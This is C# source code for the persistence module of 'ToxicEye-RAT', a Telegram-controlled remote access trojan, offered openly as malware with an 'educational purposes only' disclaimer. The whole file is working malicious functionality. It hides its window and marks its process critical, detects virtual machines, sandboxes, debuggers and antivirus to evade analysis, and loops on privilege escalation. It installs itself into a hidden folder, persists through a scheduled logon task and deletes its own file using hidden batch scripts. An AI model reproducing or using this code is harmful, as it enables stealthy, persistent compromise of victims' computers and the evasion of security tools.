/* 
       ^ Author    : LimerBoy
       ^ Name      : ToxicEye-RAT
       ^ Github    : https://github.com/LimerBoy

       > This program is distributed for educational purposes only.
*/

using System;
using System.IO;
using System.Threading;
using System.Management;
using System.Reflection;
using System.Diagnostics;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace TelegramRAT
{
    internal sealed class persistence
    {

        public static Thread processCheckerThread = new Thread(processChecker);

        // Import dll'ls
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern EXECUTION_STATE SetThreadExecutionState(EXECUTION_STATE esFlags);
        public enum EXECUTION_STATE : uint
        {
            ES_CONTINUOUS = 0x80000000,
            ES_DISPLAY_REQUIRED = 0x00000002,
            ES_SYSTEM_REQUIRED = 0x00000001
        }


        // On shutdown/logoff send message.
        public partial class MainForm : Form
        {
            // Import dll's
            public const int WM_QUERYENDSESSION = 0x0011;
            public const int WM_ENDSESSION = 0x0016;
            public const uint SHUTDOWN_NORETRY = 0x00000001;

            [DllImport("user32.dll", SetLastError = true)]
            static extern bool ShutdownBlockReasonCreate(IntPtr hWnd, [MarshalAs(UnmanagedType.LPWStr)] string reason);
            [DllImport("user32.dll", SetLastError = true)]
            static extern bool ShutdownBlockReasonDestroy(IntPtr hWnd);
            [DllImport("kernel32.dll")]
            static extern bool SetProcessShutdownParameters(uint dwLevel, uint dwFlags);


            // Invisible Form
            public MainForm()
            {
                this.FormBorderStyle = FormBorderStyle.None;
                this.ShowInTaskbar = false;
                this.Visible = false;
                this.Opacity = 0.0;
                this.Load += new EventHandler(MainForm_Load);

                SetProcessShutdownParameters(0x3FF, SHUTDOWN_NORETRY);
            }
            // Change form size
            void MainForm_Load(object sender, EventArgs e)
            {
                this.Size = new System.Drawing.Size(0, 0);
            }

            // Disable process protection on windows shutdown/logoff
            protected override void WndProc(ref Message m)
            {
                if (m.Msg == WM_QUERYENDSESSION || m.Msg == WM_ENDSESSION)
                {
                    // Prevent windows shutdown
                    Console.WriteLine("[!] Shutdown signal received..");
                    ShutdownBlockReasonCreate(this.Handle, "Please wait...");
                    // Disable process protection
                    unprotectProcess();
                    telegram.sendText("🍂 Target turns off the power on the device...");
                    // Close process
                    ShutdownBlockReasonDestroy(this.Handle);
                    Environment.Exit(0);
                    return;
                }
                base.WndProc(ref m);
            }
        }

        // Get process list
        private static List<string> GetProcessList()
        {
            List<string> output = new List<string>();

            foreach (Process proc in Process.GetProcesses())
            {
                output.Add(proc.ProcessName.ToUpper());
            }
            return output;
        }

        // Process checker
        public static void processChecker()
        {
            // Check if disabled.
            if(!config.BlockNetworkActivityWhenProcessStarted)
            {
                return;
            }
            // Run checker
            Console.WriteLine("[+] Process checker started");
            string proc;
            while (true)
            {
                List<string> processList = GetProcessList();

                foreach(string process in config.BlockNetworkActivityProcessList)
                {
                    proc = process.ToUpper();
                    if (processList.Contains(proc))
                    {
                        // Stop command checking
                        if (!telegram.waitThreadIsBlocked)
                        {
                            Console.WriteLine("[!] Stopping command listener thread");
                            telegram.waitThreadIsBlocked = true;
                            while(true)
                            {
                                processList = GetProcessList();
                                if(!processList.Contains(proc))
                                {
                                    Console.WriteLine("[+] Restarting command listener thread");
                                    telegram.waitThreadIsBlocked = false;
                                    telegram.sendText($"🙊 Found blocked process {process}.exe");
                                    break;
                                }
                                Thread.Sleep(1000);
                            }
                            break;
                        }
                    }
                }
                Thread.Sleep(1500);
            }
        }


        // Protect process
        public static void protectProcess()
        {
            if(config.ProcessBSODProtectionEnabled)
            {
                Console.WriteLine("[+] Set process critical");
                try
                {
                    Process.EnterDebugMode();
                    RtlSetProcessIsCritical(1, 0, 0);
                }
                catch { }
            }
        }

        // Unprotect process
        public static void unprotectProcess()
        {
            if (config.ProcessBSODProtectionEnabled)
            {
                try
                {
                    Console.WriteLine("[+] Set process not critical");
                    RtlSetProcessIsCritical(0, 0, 0);
                }
                catch { }
            }
        }

        // Hide console window
        public static void HideConsoleWindow()
        {
            if(config.HideConsoleWindow)
            {
                Console.WriteLine("[+] Hiding console window");
                IntPtr handle = GetConsoleWindow();
                ShowWindow(handle, 0);
            }
        }

        // VirtualBox
        public static bool inVirtualBox()
        {
            using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                try
                {
                    using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
                    {
                        foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
                        {
                            if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
                            {
                                return true;
                            }
                        }
                    }
                }
                catch
                {
                    return true;
                }
            }
            foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
            {
                if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
                {
                    return true;
                }
            }
            return false;
        }

        // SandBoxie
        public static bool inSandboxie()
        {
            string[] array = new string[5]
            {
                "SbieDll.dll",
                "SxIn.dll",
                "Sf2.dll",
                "snxhk.dll",
                "cmdvrt32.dll"
            };
            for (int i = 0; i < array.Length; i++)
            {
                if (GetModuleHandle(array[i]).ToInt32() != 0)
                {
                    return true;
                }
            }
            return false;
        }

        // Debugger
        public static bool inDebugger()
        {
            try
            {
                long ticks = DateTime.Now.Ticks;
                System.Threading.Thread.Sleep(10);
                if (DateTime.Now.Ticks - ticks < 10L)
                {
                    return true;
                }
            }
            catch { }
            return false;
        }

        // Detect antiviruses
        public static string DetectAntivirus()
        {
            try
            {
                using (ManagementObjectSearcher antiVirusSearch = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2", "Select * from AntivirusProduct"))
                {
                    List<string> av = new List<string>();
                    foreach (ManagementBaseObject searchResult in antiVirusSearch.Get())
                    {
                        av.Add(searchResult["displayName"].ToString());
                    }
                    if (av.Count == 0) return "N/A";
                    return string.Join(", ", av.ToArray()) + ".";
                }
            }
            catch
            {
                return "N/A";
            }
        }


        //  TaskScheduler command
        private static void TaskSchedulerCommand(string args)
        {
            // If autorun disabled
            if(!config.AutorunEnabled)
            { return; }
            // Add to autorun
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.FileName = "schtasks.exe";
            startInfo.Arguments = args;
            process.StartInfo = startInfo;
            process.Start();
            process.WaitForExit();
        }

        // Elevate previleges
        public static void elevatePrevileges()
        {
            while (true)
            {
                // Elevate previleges
                if (!utils.IsAdministrator())
                {
                    Console.WriteLine("[~] Trying elevate previleges to administrator...");
                    Process proc = new Process();
                    proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    proc.StartInfo.FileName = Application.ExecutablePath;
                    proc.StartInfo.Arguments = "";
                    proc.StartInfo.UseShellExecute = true;
                    proc.StartInfo.Verb = "runas";
                    proc.StartInfo.CreateNoWindow = true;
                    try
                    {
                        proc.Start();
                        proc.WaitForExit();
                        unprotectProcess();
                        Environment.Exit(1);
                    }
                    catch (System.ComponentModel.Win32Exception)
                    { 
                        if(config.AdminRightsRequired)
                        { continue; } else { break; }
                    }
                } else { break; }
            }
        }

        
        // Copy self to system
        public static void installSelf()
        {
            Console.WriteLine("[+] Copying to system...");
            if(!Directory.Exists(Path.GetDirectoryName(config.InstallPath)))
            {
                // Create dir
                Directory.CreateDirectory(Path.GetDirectoryName(config.InstallPath));
            }
            if(!System.IO.File.Exists(config.InstallPath))
            {
                // Copy
                System.IO.File.Copy(Application.ExecutablePath, config.InstallPath);
                DirectoryInfo dir = new DirectoryInfo(Path.GetDirectoryName(config.InstallPath));
                // Set hidden attribute
                if (config.AttributeHiddenEnabled)
                {
                    dir.Attributes |= FileAttributes.Hidden;
                }
                // Set system attribute
                if (config.AttributeSystemEnabled)
                {
                    dir.Attributes |= FileAttributes.System;
                }
                
            }
        }

        // Remove self from system
        public static void uninstallSelf()
        {
            Console.WriteLine("[+] Uninstalling from system...");
            // Disable process protection
            unprotectProcess();
            // Delete from autorun
            delAutorun();
            // Remove directory
            // Paths
            string batch = Path.GetTempFileName() + ".bat";
            string currentPid = Process.GetCurrentProcess().Id.ToString();
            // Disable process protection
            persistence.unprotectProcess();
            // Write batch
            using (StreamWriter sw = File.AppendText(batch))
            {
                sw.WriteLine(":l");
                sw.WriteLine("Tasklist /fi \"PID eq " + currentPid + "\" | find \":\"");
                sw.WriteLine("if Errorlevel 1 (");
                sw.WriteLine(" Timeout /T 1 /Nobreak");
                sw.WriteLine(" Goto l");
                sw.WriteLine(")");
                sw.WriteLine("Rmdir /S /Q \"" + Path.GetDirectoryName(config.InstallPath) + "\"");
            }
            // Start
            Process.Start(new ProcessStartInfo()
            {
                Arguments = "/C " + batch + " & Del " + batch,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
            // Done
            Environment.Exit(1);
        }

        // Check if program in virtualbox/sandbox/debugger
        public static void runAntiAnalysis()
        {
            if(config.PreventStartOnVirtualMachine)
            {
                if (inSandboxie() || inVirtualBox() || inDebugger())
                    Environment.Exit(2);
            }
        }

        // Install to startup
        public static void setAutorun()
        {
            Console.WriteLine("[+] Installing to autorun...");
            TaskSchedulerCommand($"/create /f /sc ONLOGON /RL HIGHEST /tn \"{config.AutorunName}\" /tr \"{config.InstallPath}\"");
        }

        // Uninstall from startup
        public static void delAutorun()
        {
            Console.WriteLine("[+] Uninstalling from autorun...");
            TaskSchedulerCommand($"/delete /f /tn \"{config.AutorunName}\"");
        }

        // Check mutex
        public static void CheckMutex()
        {
            bool createdNew = false;
            // For elevation
            string mutex = utils.MD5(config.TelegramChatID);
            if(utils.IsAdministrator())
            {
                mutex = "ADMIN:" + mutex;
            }
            // Check
            Mutex currentApp = new Mutex(false, mutex, out createdNew);
            if (!createdNew)
            {
                Console.WriteLine("[?] Already running 1 copy of the program");
                Environment.Exit(1);
            }
        }

        // Sleep before start
        public static void Sleep()
        {
            int sleepTime;
            sleepTime = config.StartDelay * 1000;
            sleepTime = new Random().Next(sleepTime, sleepTime + 3000);
            Console.WriteLine($"[?] Sleeping {sleepTime}");
            Thread.Sleep(sleepTime);
        }

        // Delete file after fisrt start
        public static void MeltFile()
        {
            // Check 1
            if(!config.MeltFileAfterStart)
            { return; }
            // Check 2
            if(Application.ExecutablePath == config.InstallPath)
            { return; }
            // Paths
            string batch = Path.GetTempFileName() + ".bat";
            string currentPid = Process.GetCurrentProcess().Id.ToString();
            // Disable process protection
            persistence.unprotectProcess();
            // Write batch
            using (StreamWriter sw = File.AppendText(batch))
            {
                sw.WriteLine(":l");
                sw.WriteLine($"Tasklist /fi \"PID eq {currentPid}\" | find \":\"");
                sw.WriteLine("if Errorlevel 1 (");
                sw.WriteLine(" Timeout /T 1 /Nobreak");
                sw.WriteLine(" Goto l");
                sw.WriteLine(")");
                sw.WriteLine($"Del \"{(new FileInfo((new Uri(Assembly.GetExecutingAssembly().CodeBase)).LocalPath)).Name}\"");
                sw.WriteLine($"Cd \"{Path.GetDirectoryName(config.InstallPath)}\"");
                sw.WriteLine("Timeout /T 1 /Nobreak");
                sw.WriteLine($"Start \"\" \"{Path.GetFileName(config.InstallPath)}\"");
            }
            // Start
            Process.Start(new ProcessStartInfo() 
            {
                Arguments = $"/C {batch} & Del {batch}",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe" 
            });
            // Done
            Environment.Exit(1);
        }

        // prevent pc to idle\sleep
        public static void PreventSleep()
        {
            try
            {
                SetThreadExecutionState(EXECUTION_STATE.ES_SYSTEM_REQUIRED | EXECUTION_STATE.ES_CONTINUOUS | EXECUTION_STATE.ES_DISPLAY_REQUIRED);
            }
            catch { }
        }


    }
}
